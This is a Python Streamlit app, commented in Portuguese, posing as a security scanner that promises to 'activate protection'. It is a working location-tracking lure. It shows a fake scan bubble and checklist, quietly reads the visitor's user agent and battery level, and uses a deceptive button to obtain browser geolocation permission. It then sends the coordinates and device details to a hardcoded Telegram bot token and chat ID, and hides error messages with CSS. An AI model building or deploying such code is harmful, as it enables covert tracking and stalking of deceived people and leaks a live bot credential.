import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval

# 1. CONFIGURAÇÃO TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (ESTILO FIXO)
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    /* MATA QUALQUER ERRO CINZA OU MENSAGEM DO SISTEMA */
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }

    /* A BARRA AMARELA QUE VOCÊ QUER */
    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

# Bolha travada em 4%
with caixa_bolha.container():
    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 4. CAPTURA AUTOMÁTICA
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_3AM_DESTRANCAR')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_3AM_DESTRANCAR')

# 5. O SEGREDO: GATILHO DE HARDWARE (NÃO PASSA PELO PYTHON)
# Este script abre o pop-up de "Permitir" instantaneamente no clique
js_button = """
<script>
function forcarAberturaGps() {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const data = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                status: 'sucesso'
            };
            // Só avisa o Streamlit DEPOIS que o usuário permitiu no pop-up
            window.parent.postMessage({type: 'streamlit:set_component_value', value: data}, '*');
        },
        (err) => { 
            console.log("Negado"); 
        },
        { enableHighAccuracy: false, timeout: 10000 }
    );
}
</script>
<button class="btn-barra" onclick="forcarAberturaGps()">
    <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
</button>
"""

# Renderiza o botão como componente HTML independente
retorno_gps = st.components.v1.html(js_button, height=80)

# 6. ANIMAÇÃO E ENVIO
if retorno_gps and isinstance(retorno_gps, dict) and retorno_gps.get('status') == 'sucesso':
    # Agora a bolha gira!
    for p in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.04)
    
    lat, lon = retorno_gps['lat'], retorno_gps['lon']
    mapa = f"https://www.google.com/maps?q={lat},{lon}"
    
    enviar_telegram(f"🛡️ *SISTEMA ATIVADO*\n\n📱 *Modelo:* `{ua[:50]}`\n🔋 *Bateria:* `{bat}`%\n📍 [LOCALIZAÇÃO]({mapa})")
    st.success("Proteção Ativada!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
